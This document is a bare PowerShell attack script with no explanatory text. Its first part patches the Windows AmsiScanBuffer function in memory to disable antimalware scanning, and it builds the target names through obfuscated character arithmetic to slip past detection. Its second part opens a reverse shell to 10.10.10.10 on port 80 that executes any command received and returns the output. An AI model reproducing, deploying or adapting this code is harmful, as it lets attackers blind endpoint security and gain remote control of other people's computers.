#Rasta-mouses Amsi-Scan-Buffer patch \n
$pwYe_M4EepnRw6N = @"
using System;
using System.Runtime.InteropServices;
public class pwYe_M4EepnRw6N {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr ldYm9fwFAyOdn, string vYUWa0a);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr X7UgUxCrFJsQnkIZESHM, UIntPtr izkuooW7, uint DwqfD9np4ML, out uint du3vtbMunUz1CCDL2);
}
"@

Add-Type $pwYe_M4EepnRw6N

$dsLLKBE_f50o = [pwYe_M4EepnRw6N]::LoadLibrary("$([cHAr]([BYtE]0x61)+[CHAR](109*107/107)+[ChAr]([BYtE]0x73)+[cHAR]([BYte]0x69)+[chAR](46*9/9)+[cHar]([bYtE]0x64)+[ChAR](97+11)+[cHAR]([byTE]0x6c))")
$o84VkIX = [pwYe_M4EepnRw6N]::GetProcAddress($dsLLKBE_f50o, "$(('ÁmsîScànB'+'ûffér').nORMALizE([cHar]([bytE]0x46)+[CHAR](111*10/10)+[ChAr](114*41/41)+[CHAR](55+54)+[ChaR]([byte]0x44)) -replace [chAr]([bYte]0x5c)+[chAr](112+27-27)+[cHar](13+110)+[CHAR](77*65/65)+[chAr]([ByTe]0x6e)+[cHar]([ByTe]0x7d))")
$p = 0
[pwYe_M4EepnRw6N]::VirtualProtect($o84VkIX, [uint32]5, 0x40, [ref]$p)
$V5Vlve = "0xB8"
$z0QHc = "0x57"
$Z4JF7BOlCBVCFeX4TR1_ = "0x00"
$P6VqfsjcuP0i4ctT = "0x07"
$APWqYWdQk7XZ4z = "0x80"
$pOOR0 = "0xC3"
$SAsWPjKz252Vw3HnoLpN = [Byte[]] ($V5Vlve,$z0QHc,$Z4JF7BOlCBVCFeX4TR1_,$P6VqfsjcuP0i4ctT,+$APWqYWdQk7XZ4z,+$pOOR0)
[System.Runtime.InteropServices.Marshal]::Copy($SAsWPjKz252Vw3HnoLpN, 0, $o84VkIX, 6)

$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()